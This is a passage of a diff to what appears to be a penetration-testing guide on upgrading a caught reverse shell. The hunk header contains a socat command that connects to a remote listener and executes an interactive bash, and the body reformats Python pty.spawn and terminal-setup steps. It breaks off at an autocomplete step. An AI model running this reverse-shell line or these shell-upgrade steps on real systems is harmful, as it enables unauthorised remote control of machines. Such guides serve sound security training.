@@ -44,18 +44,17 @@ socat TCP:me:1234 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 
 ```shell
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-
-or (depending on Python version available)
-
-```shell
-python -c 'import pty;pty.spawn("/bin/bash")'
-```
-
-```shell
 alias ls='ls --color=auto'
 export TERM=xterm
 ```
+
+```shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+alias ls='ls --color=auto'
+export TERM=xterm
+```
+
+depending on Python version available.
 
 - Set up autocomplete. Background the shell using `CTRL + Z` and run 
 
